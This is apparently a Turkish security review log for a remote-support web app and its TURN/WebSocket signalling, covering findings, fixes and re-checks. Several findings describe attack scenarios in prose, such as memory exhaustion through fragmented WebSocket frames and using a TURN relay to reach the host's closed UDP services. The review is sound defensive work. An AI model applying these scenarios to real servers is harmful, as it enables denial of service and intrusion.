- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found**.
- gitleaks: bu makinede kurulu değil (CI'da çalışıyor). Yerine regex ile gizli değer taraması yapıldı (node_modules, .next,
  generated, test ve e2e hariç): eşleşme yok. Kökte yalnız `.env.example` var; `SESSION_REF_KEY=` ve
  `TRUSTED_PROXY_CIDR=` boş.
- `git log -- '*.env*'`: dizin git deposu değil, geçmiş taranamadı.

### Tasarımda vaat edilip kodda bulunmayanlar

- G-02 / mimari §338 global `resolve_failed` alarmı: yok (S-P2-3).
- Bunun dışında P2'nin vaat ettiği kontrollerin hepsi kodda bulundu (aşağıda).

### Olumlu

- Token: `randomBytes(32)` base64url, 256 bit (lib/ids.ts:8). DB'de yalnız `sha256` (service.ts:80; CHECK
  `token_hash_fmt_chk`). Düz token yalnız create yanıtında (`link`), `no-store` ile (routes.ts:38); GET/list link döndürmüyor.
- Kod: `randomInt` CSPRNG ile 8 hane. `active_code` UQ global tekil, çakışmada TX 5 kez yeniden deneniyor. CHECK
  `code_pending_chk` sayesinde kod PENDING dışında DB düzeyinde NULL. `toView` PENDING dışında kodu göstermiyor
  (service.ts:35).
- sessionRef: HMAC-SHA256(key, id) + id, `safeEqual` ile sabit süreli ve uzunluk sızdırmayan karşılaştırma
  (codes.ts:21-25, ids.ts:13-15). Biçimsiz veya yanlış ref 404. Status yanıtı yalnız `{status}`.
- Enumeration: kod yolunda yalnız PENDING bulunabiliyor, 404 ile 410 farkı yalnız token sahibine durum bildiriyor (link
  sahibi meşru taraf). Biçimsiz id 404 (routes.ts:25-29).
- Limitler: başarısız kod ip 10/dk + önek 30/dk, 15 dk blok; token 30/dk; status 60/dk. Kontrol DB'ye gitmeden önce yapılıyor.
  Sayaçlar 50k kayıtla sınırlı ve fail-closed.
- Yarış: iptal ve expiry tek koşullu `updateMany` (status='PENDING' + expires_at). Oluşturmada teknisyen satırı
  `FOR UPDATE` ile açık oturum ve saatlik limit serileştiriliyor (repo.ts:37-39).
- Yetki/IDOR: her sorgu `tenantId` kapsamında. USER yalnız kendi oturumunu görüyor (`technicianId` kapsamı filtreyi
  eziyor, repo.ts:73-76). Başka tenant veya başkasının oturumuna GET/cancel 404 dönüyor. Create başka tenant'ta FORBIDDEN
  (service.ts:58). İzinler sessions.create/view/delete (mimari-api ile uyumlu).
- CSRF: teknisyen POST'larında double-submit + Origin (guards.ts:17-22). Public resolve'da Origin allowlist var, çerez
  kullanılmıyor.
- Sızıntı: pino URL'de sorgu dizesini atıyor, `/session/***` maskeleniyor, `*.token` redakte ediliyor (logger.ts).
  Caddy logu sorgu, `/session/…`, Cookie, Referer ve Location alanlarını siliyor. `next=` /session/ yollarına
  yazılmıyor (proxy.ts:43). Sayfada `referrer: no-referrer` ve `noindex`, proxy'de `Referrer-Policy: no-referrer` var.
  Token istemci JS'ine verilmiyor, istemci yalnız ref ile yokluyor.
- SSRF yok: web, sabit `API_INTERNAL_URL`'e regex ile doğrulanmış token'ı JSON gövdede gönderiyor. Link
  `PUBLIC_BASE_URL`'den kuruluyor, Host başlığından değil.
- CSP: nonce + `strict-dynamic`, `unsafe-inline` yok, `frame-ancestors 'none'`, `base-uri 'none'`, `object-src 'none'`.
- DB: `app` kullanıcısında support_sessions için yalnız SELECT/INSERT/UPDATE var, DELETE/DDL yok (grants.sql:18-19).
  CHECK kısıtları durum, ended_at ve TTL (15-30 dk) için ikinci savunma hattı.
- Ağ: web ve server port yayımlamıyor, db ağı `internal`. Güvenilen CIDR /31 tam olarak caddy ve web'i kapsıyor,
  dinamik aralık (.128/25) dışında.

### Öneri: `docs/gereksinimler.md` §9 "Sonra"

S-P2-1 (Caddy-web paylaşılan sır), S-P2-2, S-P2-4, S-P2-6, S-P2-7. **P3 öncesi kapanmalı:** S-P2-3, S-P2-5 ve
"P3 giriş şartları" 1-3.

## P2 Tur 2

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1 (+2 bilgi notu). Kapanan: S-P2-1, S-P2-2, S-P2-3, S-P2-6, S-P2-7.
Açık kalan (kapsam gereği): S-P2-4 (metin düzeltildi, sunucu davranışı P3), S-P2-5 (P3 öncesi staging'de) ve P3 giriş şartları.

### Düzeltme doğrulaması

- **S-P2-1 — kapandı.** `caddy adapt` (caddy:2.11.9) çıktısı: web bloğu `headers.request.set{"X-Edge-Auth"}`
  (_set_ = istemcinin aynı ad başlığını ezer), `/api/*` ve `/ws/*` blokları `delete X-Edge-Auth` (sır server'a gitmez).
  Web'e giden tek blok `handle` (Caddyfile:79-87); `@ops` 404. Üç reverse_proxy'de de `trusted_proxies` yok, yani Caddy
  gelen XFF'i yok sayıp tek değer (soket adresi) yazar. Web ilk öğeyi alıp `isIP` ile doğruluyor (edge-forward.ts:43-46),
  bu Caddy davranışıyla tutarlı. Karşılaştırma iki SHA-256 özeti üzerinde `timingSafeEqual` ile yapılıyor; uzunluk
  sızmıyor, boş değer reddediliyor (edge-forward.ts:19-24). Sır üç yerde de loglanmıyor: Caddy log filtresi
  `request>headers>X-Edge-Auth delete` (Caddyfile:42); web başlığı server'a iletmiyor (`forwardHeaders` yalnız XFF ve UA
  döndürüyor); server pino serileştiricisi yalnız method ve maskeli url yazıyor (logger.ts:39). Compose sırrı hem caddy
  hem web için `:?` ile zorunlu tutuyor (docker-compose.yml:110,127). `EDGE_PROXY_SECRET`'in `NEXT_PUBLIC_` öneki yok,
  `node:crypto` kullandığı için istemci paketine de giremez.
- **S-P2-2 — kapandı.** UA 512'ye kesiliyor (web), server audit'te 300'e kesiyor (audit/service.ts:44). Başlık enjeksiyonu
  mümkün değil: gelen başlık değerinde CR/LF olamaz (Node ayrıştırıcısı reddeder), undici `Headers` da reddeder.
  Gelen değerler latin1 olduğu için `slice` geçersiz bayt üretmiyor.
- **S-P2-3 — kapandı.** `ResolveFailedAlarm` (public.ts:37-74): tek sayaç + en çok 10.000 önek tutan Set, pencere
  başında temizleniyor. Alarm pencere başına bir kez tetikleniyor. Log içeriği yalnız `{failed, prefixes(sayı), windowSec}`,
  IP/önek/kod yazılmıyor. İstek engellenmiyor (G-02 ile uyumlu).
- **S-P2-6 — kapandı.** `goneAudit` (public.ts:113-117) anahtarı `sessionId:code`, sayaç limiti 2, pencere 10 dk: ilk
  olay yazılıyor, sonrakiler atlanıyor. Sayaç 50k kayıtla sınırlı. Anahtar üretmek için geçerli bir oturum token'ı/kodu
  gerekiyor, saldırgan sayacı dolduramıyor. Audit satırında token ve kod yok.
- **S-P2-7 — kapandı.** `env.ts:37-40` production'da `SESSION_REF_KEY` olmadan açılışı durduruyor (min 32).
- **Regresyon:** `repo.countOpen` artık ACTIVE + süresi dolmamış PENDING oturumları sayıyor (repo.ts:46-50). Süresi dolmuş
  PENDING kayıt limiti doldurmuyor, `FOR UPDATE` serileştirmesi korunuyor. Bir sorun görmedim. `lib/api.ts`
  `isUnauthenticated`/`EXPIRED_LOGIN_PATH` sabit bir yol kullanıyor; `next=` üretmediği için açık yönlendirme yüzeyi
  oluşmuyor.

### Bulgular

#### S-P2-T2-1 [DÜŞÜK] Edge sırrı yanlış yapılandırılırsa hata çalışma anında ortaya çıkıyor; tüm müşteriler tek IP limitini paylaşır — A05

Yer: apps/web/lib/server-api.ts:90 (`readEdgeSecret()` istek başına çağrılıyor), apps/web/lib/edge-forward.ts:30-37
Sorun: Production'da sır yoksa veya kısaysa web açılmaya devam ediyor; hata yalnız müşteri sayfası istendiğinde (500)
çıkıyor. Caddy ile web'deki sır farklıysa (biri yenilenip diğeri yeniden yaratılmadıysa) hata da çıkmıyor: XFF sessizce
iletilmiyor ve tüm müşteriler web IP'si (`172.30.0.3`) altında sayılıyor.
İstismar senaryosu: Sırlar uyuşmazken bir saldırgan dakikada 11 hatalı kod denemesi yapar. Bu, `172.30.0.3` ipKey'ini
15 dk kilitler. Kilit süresince hiçbir müşteri kod ile bağlanamaz (DoS). Token yolu da 30/dk'lık ortak sınıra düşer.
Runbook:103 belirtiyi ve tanıyı anlatıyor ama durumu kendiliğinden fark eden bir şey yok.
Düzeltme: (a) Web açılışında `readEdgeSecret()` çağrılsın (`instrumentation.ts` `register()`); sır yoksa süreç
başlamasın. (b) Server'da `ctx.ip === <web adresi>` olan public resolve için `log.warn` (oranı sınırlı) yazılsın ya da
metrik sayılsın; böylece uyuşmazlık görünür olur. (atanan ajan: frontend-dev (a), backend-dev (b)) — "Sonra" önerilir.

#### Bilgi notları (bulgu değil)

- `goneAudit` sayacı 50k kilitli kayıtla dolarsa `hit` true döner ve 410 audit'i atlanır (limit için fail-closed,
  audit için fail-open). Dolması için 50k farklı bitmiş oturumun geçerli token'ı gerekir, pratikte olmaz.
- `apps/web/lib/server-api.ts`'de `import "server-only"` yok. `node:crypto`, `next/headers` ve `cookies` içe aktarımları
  istemci paketine girmeyi zaten engelliyor; açık niyet için eklenmesi önerilir.

### Otomatik tarama çıktıları (Tur 2)

- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found.**
- gitleaks v8.30.1 (`dir`, `.gitleaks.toml` ile, node_modules/.next hariç kopya, göreli yol): **no leaks found.**
  e2e sırrı (`playwright.config.ts:29`) ve CI sırrı (`ci.yml:100`) `generic-api-key` kuralını tetiklemiyor (düşük
  entropi), allowlist eklemeye gerek yok. Not: mutlak yolla (`/repo/...`) taranırsa mevcut allowlist'teki
  `^apps/server/test/helpers/app\.ts$` eşleşmiyor ve 1 bulgu çıkıyor. CI `git` modunda göreli yol kullandığı için
  sorun değil.
- `caddy adapt`: header işlemleri yukarıdaki gibi doğrulandı (set / delete, trusted_proxies yok).

## P2 Tur 3

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0. Kapanan: S-P2-T2-1 (a + b) ve `server-only` bilgi notu.
Açık kalan (kapsam gereği, değişmedi): S-P2-4 (P3), S-P2-5 (P3 öncesi staging) ve P3 giriş şartları.

### Düzeltme doğrulaması

- **S-P2-T2-1 (a) web açılış kontrolü: kapandı.** `apps/web/instrumentation.ts:6-10` yalnız `NEXT_RUNTIME=nodejs` ve
  `NODE_ENV=production` koşulunda `lib/startup-check.ts`'i dinamik olarak import ediyor. `assertEdgeSecretOrExit()`
  (startup-check.ts:9-16) `readEdgeSecret()` hata verirse yalnız hata mesajını yazıp `process.exit(1)` çağırıyor. Mesaj
  sabit metin (`edge-forward.ts:34`: "EDGE_PROXY_SECRET gerekli (>= N karakter …)"), yani sır değeri ve uzunluğu
  loglanmıyor. İmaj (`apps/web/Dockerfile:27`) ve compose (`docker-compose.yml:106`) `NODE_ENV=production` veriyor,
  dolayısıyla kontrol staging/prod'da devrede.
  Edge sızıntısı yok: `.next/server/edge/chunks/_1wcossgycoscr._.js` içinde `register` boş bir fonksiyona derlenmiş
  (`async function t(){}`). `startup-check`, `process.exit` ve hata metni edge veya `static` paketlerinde yok; yalnız Node
  sunucu chunk'ında bulunuyor. Sınır: Caddy ile web'de iki farklı geçerli sır olması açılışta yakalanamaz; bu durumu (b)
  kapatıyor.
- **S-P2-T2-1 (b) server alarmı: kapandı.** `ClientIpIsProxyAlarm` (public.ts:79-97) `resolvePublicSession`'ın ilk
  satırında çağrılıyor (public.ts:150), yani token ve kod yollarının ikisinde de çalışıyor.
  - İstek engellenmiyor: `check()` hiçbir şey döndürmüyor ve fırlatmıyor.
  - Log satırı: `app.log` (istek logger'ı değil) ile yazılan `{alarm:"client_ip_is_proxy"}` + sabit mesaj. IP, token,
    reqId ve url yok. Entegrasyon testi (sessions-public.test.ts:172-196) IP'lerin ve token'ın logda olmadığını
    doğruluyor.
  - DoS/bellek: throttle `FixedWindowCounter(1, 60s, 60s, sweepIntervalMs:0)` ve tek sabit anahtar `"proxy"`
    kullanıyor; en çok 1 kayıt tutuyor, zamanlayıcı yok (bu yüzden `closePublicLimits`'te kapatılmaması sızıntı
    oluşturmuyor). Maliyet O(1). Alarm dakikada en çok 1 warn üretiyor. Dışarıdan bir istemci tetikleyemiyor, çünkü
    Caddy XFF'i her zaman yeniden yazıyor ve dış istemcinin IP'si 172.30.0.2/31 içinde olamıyor.
- **`cidrMatcher` (ip.ts:37-49): doğru.** `node:net` `BlockList` ile denendi (`172.30.0.2/31` ve `fd00:30::/64`):

  | Girdi                                                                         | Sonuç                            |
  | ----------------------------------------------------------------------------- | -------------------------------- |
  | `.2` / `.3` / `.4`                                                            | true / true / false              |
  | `::ffff:172.30.0.3`, `::FFFF:…`, `0:0:0:0:0:ffff:172.30.0.3`, `::ffff:ac1e:3` | true (eşlemeli IPv6 yakalanıyor) |
  | `172.30.0.3%eth0`, `fd00:30::1%lo`                                            | true (zone id atılıyor)          |
  | `""`, `garbage`, `1.2.3.4/32`, `::1`                                          | false (fırlatmıyor)              |
  | IPv6 CIDR'a karşı IPv4 / eşlemeli adres                                       | false                            |
  | `cidr` `undefined` veya `""`                                                  | her zaman false                  |

  Geçersiz CIDR'da `addSubnet` fırlatır, ama `env.ts:7-12` biçimi ve prefix üst sınırını (≤32 / ≤128) açılışta
  doğruluyor; production'da CIDR zorunlu (env.ts:33). Hata kapalı yönde çalışıyor: eşleşme yoksa sonuç yalnız
  "alarm yok" oluyor.

- **`server-only`: kapandı.** `apps/web/lib/server-api.ts:1` içinde `import "server-only"` var. Next'in kendi derlenmiş
  kopyasına yönlendiriliyor, yeni bağımlılık eklenmemiş.

### Bulgular

Yok.

### Otomatik tarama / test (Tur 3)

- `vitest run test/unit/{ip,resolve-alarm,env-logger}.test.ts` (server): 3 dosya, **13/13 geçti**.
- Build çıktısı taraması (edge/static chunk'larında `startup-check` / `process.exit` / hata metni): **yok**.
- Bağımlılık değişmediği için `pnpm audit` ve gitleaks Tur 2 sonuçları geçerli.

---

## P3 kod turu

DURUM: DÜZELTİLMELİ
Özet: Kritik 0 / Yüksek 1 / Orta 1 / Düşük 7. Tek Yüksek bulgu bağımlılık sürümünden geliyor, düzeltmesi tek satır.
Protokol ve oda mantığında Kritik/Yüksek bulgu yok.

### Bulgular (öncelik sırasıyla)

#### S-P3-1 [YÜKSEK] `ws` 8.18.3: küçük parçalı çerçevelerle bellek tüketme DoS (GHSA-96hv-2xvq-fx4p) — A06 Vulnerable Components

Yer: apps/server/package.json (`ws`), kilit `ws@8.18.3`; apps/server/src/signaling/ws.ts:54 (`maxPayload: 1024 * 1024`)
Sorun: `pnpm audit` Yüksek: ws <8.21.0'da çok sayıda küçük fragment/veri parçası sunucu belleğini tüketiyor. Ayrıca Orta
(GHSA-58qx-3vcg-4xpx, <8.20.1, ilklenmemiş bellek ifşası).
Senaryo: Oturum kodunu bilen biri (müşteri tarafı ya da kodu ele geçiren kişi) resolve → join ile ticket alıyor ve
**admit beklemeden** lobi WS'ine bağlanıyor. Ardından tek mesajı binlerce küçük fragmana bölerek gönderiyor. Mesaj
tamamlanmadığı için 64 KB/50 msg/sn kontrolleri (handlers.ts:41-43) hiç devreye girmiyor. Tek instance (ADR-0005)
OOM olursa tüm tenant'ların aktif oturumları düşer. Kimliği doğrulanmış her teknisyen de aynı saldırıyı yapabilir.
Düzeltme (backend-dev): `ws` ≥ 8.21.0 sürümüne geçilmeli, `pnpm install` ile kilit güncellenmeli ve `pnpm audit`
temiz çıkmalı. Ek önlem: `maxPayload` değeri `WS_MAX_PAYLOAD` (64 KB) ile eşitlenmeli. 64 KB üstü 1009 ile kapanır,
AC-17 testi buna göre güncellenir (implementation.md P3 madde 6). Böylece bağlantı başına tampon 16 kat küçülür.

#### S-P3-2 [ORTA] coturn `allowed-peer-ip=<public IP>` TURN host'unun tüm UDP portlarını relay'e açıyor — A05/A10 (SSRF benzeri)

Yer: deploy/turn/entrypoint.sh:56-57; deploy/turn/docker-compose.yml:15 (`network_mode: host`)
Sorun: relay↔relay için TURN'ün kendi public IP'si izin listesine alınmış. coturn'de `allowed-peer-ip` port ayırmıyor,
bu yüzden yalnız 49160-49199 değil o IP'deki **her UDP portu** relay edilebiliyor. Staging'de TURN, publish
sunucusunun (185.126.217.99, başka servisler de çalışıyor) host ağında. Relay'in kendi IP'sine gönderdiği paket
loopback üzerinden döndüğü için UFW'nin dış kurallarını atlıyor.
Senaryo: Admit edilen misafir (ya da credential'ı ele geçiren biri) TURN credential'ıyla allocation açıyor ve peer
olarak `185.126.217.99:<udp port>` veriyor. Böylece host'ta 0.0.0.0'a bağlı, dışarıya kapalı UDP servislerine (DNS,
VPN, SNMP, syslog vb.) ulaşıyor. coturn'ün kendi 3478'ine relay ederek TURN-in-TURN zinciri de kurabiliyor.
`no-tcp-relay` riski UDP ile sınırlıyor.
Düzeltme (devops): Host'ta OUTPUT kuralı eklenmeli: kaynak portu 49160:49199 olan ve hedefi `$PUBLIC_IP` olan UDP
paketlerinde hedef port 49160:49199 değilse DROP (iptables/nftables, runbook §9). `test-denied.sh`'e iki negatif test
eklenmeli: `$PUBLIC_IP:3478` ve `$PUBLIC_IP:53` relay edilememeli. Staging'de `ss -ulnp` çıktısı runbook'a
yazılmalı. Prod'da ayrı VM planı (ADR-0007) korunmalı.

#### S-P3-3 [DÜŞÜK] IPv6 relay sınırsız: `relay-ip`/`listening-ip` verilmemiş

Yer: deploy/turn/turnserver.base.conf:4-19, 39-52; entrypoint.sh:49
Sorun: Host'un global IPv6'sı varsa coturn IPv6 relay açabilir (REQUESTED-ADDRESS-FAMILY). Host'un kendi IPv6
adresi ve sağlayıcının IPv6 komşuları denied listesinde yok. IPv4'teki sağlayıcı bloğu engelinin IPv6 karşılığı da yok.
Düzeltme (devops): Entrypoint, `TURN_EXTERNAL_IP`'nin private kısmından `relay-ip=<private v4>` (gerekirse
`listening-ip`) üretmeli. Alternatif olarak host'un IPv6 /64'ü local listeye eklenmeli. `test-denied.sh`'e IPv6
allocation denemesi eklenmeli.

#### S-P3-4 [DÜŞÜK] Süresi dolan PENDING oturum odaya bildirilmiyor; bazı odalar bellekten hiç silinmiyor

Yer: apps/server/src/sessions/service.ts:137-145 (expire yolu `closeSession` çağırmıyor); rooms.ts:121
(`rejectedIps.size === 0 && admitFails === 0` şartı)
Sorun: EXPIRED olan oturumda teknisyen WS'i ve lobi misafirleri açık kalıyor (lobi en fazla 5 dk). Ret veya hatalı
kod görmüş bir oda, teknisyen ayrıldıktan sonra süreç yeniden başlayana kadar bellekte duruyor. Oda üretmek kimlik
doğrulaması gerektirdiği için etkisi yavaş bir sızıntı.
Düzeltme (backend-dev): Expiry işi başarılı `expireOne` sonrası `rooms.closeSession(id, "timeout")` çağırmalı;
`RoomNotifier` tipine `"timeout"` eklenmeli. `dropRoomIfIdle` yalnız PENDING süresi geçmiş odaları ret listesiyle
birlikte silebilir.

#### S-P3-5 [DÜŞÜK] CI gitleaks (git modu) yeni P3 test dosyalarında kırılacak

Yer: .gitleaks.toml:8-11 (allowlist yalnız `apps/server/test/helpers/app.ts`). Yerel dir taramasında `generic-api-key`
veren dosyalar: apps/server/test/helpers/ws.ts:56, test/integration/signaling-lifecycle.test.ts:15,
test/unit/signaling.test.ts:12 ve :67. Değerlerin hepsi sahte TURN secret'ı.
Düzeltme (backend-dev): Bu yollar allowlist'e eklenmeli ya da satırlara `// gitleaks:allow` yazılmalı. Commit
öncesinde git modunda yeniden taranmalı. Not: allowlist regex'i `^apps/...` ile başladığı için dir modunda
(`/repo/apps/...`) eşleşmiyor; yerel kontrol için `(^|/)apps/...` biçimi önerilir.

#### S-P3-6 [DÜŞÜK] TURN credential oturum bittikten sonra 60 dakikaya kadar geçerli

Yer: apps/server/src/signaling/turn.ts:29; env.ts:35 (`TURN_CRED_TTL_MIN` varsayılan 60)
Sorun: Admin terminate, ret veya müşterinin bitirmesi credential'ı iptal etmiyor (`use-auth-secret` yapısı gereği).
Eski misafir relay'i internete yönelik bant genişliği için kullanmaya devam edebilir (8 Mbps ve user-quota=8 ile
sınırlı).
Düzeltme (devops/backend-dev): Varsayılan 15-20 dk yapılmalı. Yenileme mekanizması (`ice.servers`, active.ts:48-60)
zaten var, ek maliyeti yok.

#### S-P3-7 [DÜŞÜK] `/ws/tech` upgrade'inde oran sınırı yok

Yer: apps/server/src/signaling/ws.ts:80-91
Sorun: Origin başlığı tarayıcı dışından taklit edilebilir. Her rastgele çerezli istek `resolveSession` ve
`findForSignal` ile DB'ye gidiyor; misafir yolundaki `guestIp` (31/dk) sınırının teknisyen yolunda karşılığı yok.
Düzeltme (backend-dev): Aynı `FixedWindowCounter` IP başına teknisyen yoluna da uygulanmalı.

#### S-P3-8 [DÜŞÜK] WS yeniden doğrulaması yetki daraltmasını yansıtmıyor; `endByTechnician` hiç çağrılmıyor

Yer: apps/server/src/signaling/ws.ts:176-183; rooms.ts:208-211
Sorun: 60 sn'lik kontrol yalnız oturum/kullanıcı/tenant geçerliliğine bakıyor. `remote_control.use`/`file_transfer.use`
geri alınsa da `room.caps` admit anındaki haliyle kalıyor. AC-115 için yazılan `endByTechnician` hiçbir yerden
çağrılmıyor. P3'te caps henüz bir işlem açmadığı için şimdilik etkisi yok.
Düzeltme (backend-dev): P7 giriş şartı. Yetki/rol değişikliği ve deaktivasyon servisleri `rooms.endByTechnician`
çağırmalı ya da yeniden doğrulama sırasında `permissions` tazelenip caps daralırsa oda bitirilmeli.

#### S-P3-9 [DÜŞÜK] coturn stdout logunda müşteri/peer IP'leri ve kullanıcı adı (sessionId) var

Yer: deploy/turn/turnserver.base.conf:17-18; docker-compose.yml:45-47 (json-file 5×10 MB, saklama süresi tanımsız)
Düzeltme (devops): Runbook'a log saklama süresi (KVKK) yazılmalı. Gerekmiyorsa log seviyesi düşürülmeli. Secret
logda görünmüyor (yalnız `TURN_CONFIG_CHECK` çıktısı var, o da maskeli).

### Doğrulanacak (çalışma zamanı, devops)

- coturn CLI (5766/tcp) kapalı mı: staging'de `ss -tlnp | grep -E '5766|9641'` çalıştırılmalı. 9641 yalnız
  127.0.0.1'de olmalı, 5766 hiç görünmemeli. Kod tarafında `--cli` verilmiyor; 4.18 varsayılanına güveniliyor.

### Otomatik tarama çıktıları

- `pnpm audit --audit-level=moderate`: **2 açık**. Yüksek 1: ws GHSA-96hv-2xvq-fx4p. Orta 1: ws GHSA-58qx-3vcg-4xpx.
  Yol: `apps/server > ws@8.18.3`. → S-P3-1.
- gitleaks v8.30.1 (docker, dir modu, `.gitleaks.toml`): 15 eşleşme, hepsi `generic-api-key`.
  - 10'u `apps/web/.next/**` derleme çıktısı (git-ignore, repoya girmiyor; Next preview anahtarı derleme başına üretiliyor).
  - 5'i sahte test değeri: test/helpers/app.ts:13 (allowlist'te ama dir modunda eşleşmiyor) ve S-P3-5'teki 4 satır.
  - Gerçek gizli bilgi bulunmadı.
- `deploy/turn/certs/` ve `*.key` git-ignore'da; repoda anahtar dosyası yok. `denied-peer-ip.local.conf` repoda yok,
  yalnız `.example` (RFC 5737 belgeleme IP'leri) var.

### Tasarımda vaat edilip kodda bulunmayanlar

- mimari §5.1 LobbyGuest "admitCodeHash (SHA-256 + oturum tuzu)": tuz olarak guestId (ULID) kullanılıyor. Hash yalnız
  bellekte tutulduğu ve kodu teknisyen girdiği için risk yok, yalnız kayda geçsin.
- AC-115 `endByTechnician` bağlantısı → S-P3-8 (P7/P9).
- P2 "P3 giriş şartları": madde 2 (atomik tüketim) karşılandı (repo.ts:145-151 koşullu `updateMany` + 5 CHECK + bellek
  `admitting` bayrağı). Madde 3 ADR-0012 ile karşılandı (`publicClientAllowed`). Madde 1 (`/public/agent/download?ref=`
  limiti) P6'ya kaldı.

### Olumlu

- WS kimlik: misafir yolunda sorgu dizesi 403 (ws.ts:103); credential yalnız `Sec-WebSocket-Protocol` üzerinden
  geliyor; `rs.v1` zorunlu ve tam bir credential bekleniyor; 43 karakterlik base64url regex var. Ticket ve nonce
  256 bit CSPRNG, depoda SHA-256 ile tutuluyor; `take` kontrolü ve silmeyi aynı senkron adımda yapıyor (yarış yok)
  ve depo 20k kayıtla sınırlı. Teknisyen yolunda Origin allowlist + çerez + `mustChangePassword` + **yalnız oturum
  sahibi** kontrolü var.
- Join: istemci türü (kind) istemcinin beyanından değil nonce kaydından alınıyor; IP limiti nonce tüketiminden önce
  uygulanıyor; durum yalnız okunuyor, tüketim admit'te.
- Admit: koşullu `updateMany` (PENDING ∧ expires>now ∧ consumed_at NULL) ve audit aynı TX'te; `room.admitting`
  bayrağı kontrolle aynı senkron adımda set ediliyor; 4 haneli kod `safeEqual` ile karşılaştırılıyor; lobi
  kodları tekil; 5. hatada lobi boşaltılıyor; ret listesi ipKey ile tutuluyor.
- Oda izolasyonu: oda upgrade anında bağlantıya bağlanıyor; relay alanları yeniden kuruluyor (gelen nesne olduğu
  gibi aktarılmıyor); strict zod, 64 KB sınırı, 50/sn token-bucket, ikili çerçeve reddi var. Lobi misafirinden SDP/ICE
  gelirse bağlantı 1008 ile kapanıyor. iceServers/TURN credential yalnız admit sonrası veriliyor (teknisyene de).
- Reconnect token her hello'da yenileniyor ve eskisi siliniyor. Bağlıyken ikinci bağlantı 403 alıyor ve audit'e
  yazılıyor. Teardown token'ı da temizliyor.
- Terminate: `sessions.terminate` yetkisi + tenant kapsamlı `updateMany` var; başka tenant'ın oturumu 404 dönüyor;
  audit yazılıyor.
- TURN: secret komut satırında yok (tmpfs'de 0600 yetkili config, umask 077); `TURN_CONFIG_CHECK` çıktısı maskeli;
  fail-closed doğrulama var (local liste zorunlu, satır biçimi denetleniyor). denied-peer-ip; 192.168.25.0/24 ve
  172.30.0.0/24'ü (192.168/16 ve 172.16/12 içinde), 169.254.169.254'ü, loopback'i, ::ffff eşlemeli adresleri ve
  6to4/Teredo/ULA aralıklarını kapsıyor. `no-tcp-relay`, quota ve max-bps tanımlı; Prometheus 127.0.0.1'de; imaj
  digest ile sabit; konteyner read_only, cap_drop ALL ve nobody kullanıcısıyla çalışıyor. CI'da denied-peer-ip
  negatif testleri var.
- /metrics: token yoksa 404, karşılaştırma `safeEqual` ile; etiketler sabit kümeden (IP/oturum/kod yok); Caddy
  dışarıya 404 dönüyor. Loglarda yalnız ret nedeni var; ticket/token/SDP/ICE loglanmıyor. Caddy logu sorgu dizesini,
  çerezi ve subprotocol'ü siliyor.

### Öneri: `docs/gereksinimler.md` §9 "Sonra"

S-P3-3, S-P3-4, S-P3-6, S-P3-7, S-P3-9. S-P3-8 P7 giriş şartı olarak işlenmeli. S-P3-1 bu pakette kapanmalı.
S-P3-2 staging'de kapanmalı (TURN publish sunucusunu paylaşıyor). S-P3-5 commit'ten önce kapanmalı.

## P3 Tur 2

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (yeni, sertleştirme) + S-P3-8 (P7 giriş şartı, açık).
"P3 kod turu"ndaki S-P3-1..7 ve S-P3-9 doğrulandı. Yeni Kritik/Yüksek bulgu yok. P3 güvenlik kapısı açık.
Kalan tek şart çalışma zamanı kanıtı: staging'de `host-firewall.sh install` + `test-denied.sh` bölüm 4 + runbook §9.2.3
çıktısı test-raporuna eklenmeli (S-P3-2 kapanışı staging'de ölçülerek yapılır).

### Düzeltme doğrulaması

| Bulgu  | Sonuç                                     | Kanıt                                                                                                                                                                                                                                                                                                                                                                                            |
| ------ | ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| S-P3-1 | KAPANDI                                   | `apps/server/package.json:31` `ws: 8.21.0`, kilitte yalnız `ws@8.21.0`. `pnpm audit`: No known vulnerabilities. `signaling/ws.ts:54` `maxPayload: WS_MAX_PAYLOAD` (64 KB), `perMessageDeflate:false`. `ws.ts:80` soket `error` dinleyicisi (yalnız role+code loglanıyor), `ws.ts:160` upgrade öncesi ham soket `error` → destroy.                                                                |
| S-P3-2 | KAPANDI (kod) / staging kanıtı bekleniyor | `deploy/turn/host-firewall.sh`: `REMOTE-TURN-OUT` zinciri; kurallar yalnız `-p udp --sport 49160:49199` ∧ (`-d public` ∨ `-d private` ∨ `addrtype LOCAL`) ∧ `! --dport 49160:49199` → DROP. `print` çıktısı staging girdisiyle doğrulandı (public 185.126.217.99, NAT arkasında yerel olmasa da `-d` kuralıyla kapsanıyor). `test-denied.sh:100-120` aralık içi echo + 3480/3478/53 DROP sayacı. |
| S-P3-3 | KAPANDI                                   | `entrypoint.sh` `relay-ip=$PRIVATE_IP` (is_ipv4 ile doğrulanmış), IPv6 relay 440.                                                                                                                                                                                                                                                                                                                |
| S-P3-4 | KAPANDI                                   | `sessions/service.ts:164` başarılı expiry sonrası `closeSession(id,"timeout")`. `rooms.ts:129-145` ret/hata taşıyan boş oda yalnız `expiresAt`'e kadar tutuluyor; `timers.idle` teardown'da (`rooms.ts:216`) temizleniyor.                                                                                                                                                                       |
| S-P3-5 | KAPANDI                                   | Sahte secret'lar `test/helpers/secrets.ts`'te; `.gitleaks.toml` `(^                                                                                                                                                                                                                                                                                                                              | /)apps/server/test/helpers/(app | secrets)\.ts$`. gitleaks dir: kaynakta 0 bulgu. |
| S-P3-6 | KAPANDI                                   | `env.ts:35` varsayılan 20, compose `${TURN_CRED_TTL_MIN:-20}`, runbook:183 güncel.                                                                                                                                                                                                                                                                                                               |
| S-P3-7 | KAPANDI                                   | `ws.ts:59,87-88` ayrı `techIp` sayacı (31/dk, 60 sn kilit), Origin/çerez/DB kontrolünden önce. IP, güvenilen proxy zinciriyle hesaplanıyor (`clientIp`, XFF taklidi yok).                                                                                                                                                                                                                        |
| S-P3-9 | KAPANDI                                   | json-file 3×5 MB; runbook §9.8.1 haftalık root cron (girdi `docker inspect`'ten, kullanıcı girdisi yok); entrypoint `cli*/verbose/log-binding` görürse başlamıyor.                                                                                                                                                                                                                               |
